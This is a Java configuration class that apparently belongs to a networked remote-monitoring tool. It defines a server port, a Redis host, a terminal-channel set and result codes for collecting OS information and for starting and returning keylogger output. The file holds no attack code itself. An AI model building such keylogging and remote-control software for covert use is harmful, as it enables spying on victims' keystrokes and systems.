package Config;

import broadcast.MyHandler;

import java.util.HashMap;

public class Config {
    public static final int NettyPort = 9999;
    public static final int BroadcastPort = 4000;
    public static final String BroadcastAddress = "127.0.0.1";
    public static final String RedisHost = "localhost";
    public static final String RedisTerminalSet = "channelid";
    public static final MyHandler myHandler;
    public static final HashMap OsInfoMap;

    public static final int Result_Code_ReturnOsInfo = 1001;
    public static final int Result_Code_StartKeyLogger = 2001;
    public static final int Result_Code_HasStartLogger = 2002;
    public static final int Result_Code_KeyLoggerNotOpen = 2003;
    public static final int Result_Code_ReturnKeyLogger = 2004;


    static {
        myHandler = new MyHandler();
        OsInfoMap = new HashMap();
    }

}
